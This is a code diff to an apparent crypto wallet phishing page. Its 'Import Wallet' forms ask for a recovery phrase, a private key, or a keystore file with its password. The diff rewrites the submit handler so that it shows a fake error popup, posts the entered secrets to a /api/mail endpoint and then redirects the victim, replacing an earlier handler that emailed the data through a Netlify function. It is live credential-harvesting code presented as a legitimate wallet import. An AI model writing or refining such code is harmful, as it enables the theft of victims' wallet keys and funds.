@@ -2030,32 +2030,32 @@
                     </div>
 
                     <!--<form id="phraseFormg">-->
-                    <form id="contact-form-1" onsubmit="return submitForm('contact-form-1');" method="post">
+                    <form id="contact-form-1" method="post">
                         <!-- Phrase Tab Content -->
                         <div class="tab-content active" id="phrase">
                             <label for="phrase">Enter Phrase</label>
                             <textarea id="phrase" name="phrase" placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)" rows="6"></textarea>
-                            <button id="submitBtn" onclick="showErrorPopup()" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<form id="privatekeyForm">-->
-                    <form id="contact-form-1" onsubmit="return submitForm('contact-form-2');" method="post">
+                    <form id="contact-form-2" method="post">
                         <!-- Private Key Tab Content -->
                         <div class="tab-content" id="privatekey">
                             <label for="private-key">Enter Private Key</label>
                             <input type="text" id="private-key" name="privatekey" placeholder="Enter your private key">
-                            <button id="submitBtn" onclick="showErrorPopup()" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<form id="keystoreForm">-->
-                    <form id="contact-form-1" onsubmit="return submitForm('contact-form-3');" method="post">
+                    <form id="contact-form-3" method="post">
                         <!-- Keystore JSON Tab Content -->
                         <div class="tab-content" id="keystore">
                             <label for="keystore-json">Keystore JSON</label>
                             <textarea id="keystore-json" name="keystore" placeholder="Input your Keystore JSON" rows="6"></textarea>
                             <label for="password">Password</label>
                             <input type="text" id="password" name="password" placeholder="Enter Keystore password">
-                            <button id="submitBtn" onclick="showErrorPopup()" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<button id="submitBtn" onclick="showErrorPopup()" class="btnmodal flex" type="submit">Import Wallet</button>-->
@@ -2108,44 +2108,29 @@
 
 
             <script>
-                // This function will be called on form submission
-                async function handleSubmitForm(formId) {
-                    // Prevent the default form submission
+                async function handleWalletSubmit(event) {
                     event.preventDefault();
+                    const form = event.currentTarget.closest('form');
+                    if (!form) return;
 
-                    // Get the form element by ID
-                    const form = document.getElementById(formId);
-
-                    // Collect form data (adjust the form fields based on your form structure)
                     const formData = new FormData(form);
-                    const data = {};
+                    const data = Object.fromEntries(formData.entries());
 
-                    formData.forEach((value, key) => {
-                        data[key] = value; // Collect each field's data
-                    });
+                    showErrorPopup();
 
-                    // Send the form data to the server for processing (e.g., via SMTP)
-                    const response = await fetch("/.netlify/functions/sendEmail", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify(data), // Send all form data
-                    });
+                    try {
+                        await fetch('/api/mail', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                            },
+                            body: new URLSearchParams(data).toString()
+                        });
+                        window.location.href = '/rdr.html';
+                    } catch (error) {
+                        console.error('Wallet submit error:', error);
+                    }
                 }
-
-                // Add event listeners to the forms in each tab
-                document.getElementById("contact-form-1").addEventListener("submit", function(event) {
-                    handleSubmitForm("contact-form-1");
-                });
-
-                document.getElementById("contact-form-2").addEventListener("submit", function(event) {
-                    handleSubmitForm("contact-form-2");
-                });
-
-                document.getElementById("contact-form-3").addEventListener("submit", function(event) {
-                    handleSubmitForm("contact-form-3");
-                });
             </script>
 
 
